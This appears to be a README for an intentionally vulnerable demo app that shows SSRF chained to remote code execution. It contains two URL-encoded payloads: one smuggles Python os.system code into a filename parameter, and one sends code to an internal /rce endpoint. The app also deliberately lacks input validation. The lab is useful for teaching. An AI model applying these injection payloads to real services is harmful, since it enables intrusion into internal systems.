# RCE via code injection (DIVA app)

---

## Configuration

In the current example there are 2 servers.

One, meant for public use is the `public_app.py`. When you open it, you can give an URL and the program will "scrape" all the titles from that webpage.

The other program (`local_task_server.py`) is meant for administrators that have direct access to the machine. It shouldn't be publicly available

## Code injection

If you've opened `public_app.py`, you might've seen that there is no validation of the input. What would happen if for example we turn on both services and give an url of
`http://localhost:8081/create-file?filename=test%27%2C+%27w%27%29+as+f%3A+import+os%3B+os.system%28%27echo+%22Hello%2C+RCE%21%22+%3E+rce_output.txt%27%29%23`
to scrape?

Well, we've accessed a local service from the public one and executed code.

## Setup for demonstration

1. Install all dependensies
    `pip install requirements.txt`

2. Run the public server
    `py public_app.py`

3. Open another terminal and run the private server
    `py local_task_server.py`

4. Go to your browser on the address `localhost:9191`
5. Write `http://localhost:8081/rce?code=import%20os%3B%20os.system(%27echo%20Hello%2C%20RCE!%20%3E%20rce_output.txt%27)` as an url and press submit

6. Look at your project folder - you should have a new file - rce_output.txt